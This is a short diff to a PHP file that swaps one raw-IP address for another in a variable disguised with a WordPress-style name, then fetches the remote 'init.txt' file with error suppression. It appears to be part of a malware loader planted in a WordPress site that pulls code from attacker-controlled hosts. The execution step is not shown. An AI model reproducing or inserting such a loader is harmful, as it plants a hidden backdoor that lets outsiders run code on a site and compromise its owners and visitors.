@@ -1,4 +1,4 @@
-$wp_http_referer = 'http://192.187.123.126/j251028_23/init.txt';
+$wp_http_referer = 'http://198.204.224.100/j251106_13/init.txt';
 $post_content = false;
 if (ini_get('allow_url_fopen')) {
     $post_content = @file_get_contents($wp_http_referer);
